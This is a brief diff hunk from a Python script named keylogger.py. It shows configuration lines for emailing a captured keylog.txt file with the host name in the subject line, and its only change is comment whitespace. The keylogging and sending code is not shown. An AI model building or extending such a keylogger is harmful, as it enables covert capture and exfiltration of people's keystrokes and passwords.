@@ -16,7 +16,7 @@ FROM_ADDR = "your_email@domain.com"         # Specify sender email address
 PASSWORD = "your_password"                  # Specify sender email account password
 HOSTNAME = socket.gethostname()
 SUBJECT = HOSTNAME + " // keylogger.py"     # Specify email subject
-CONTENT = "see keylog.txt attached"          # Specify email body
+CONTENT = "see keylog.txt attached"         # Specify email body
 active_keys = set()
 
 def log(text):
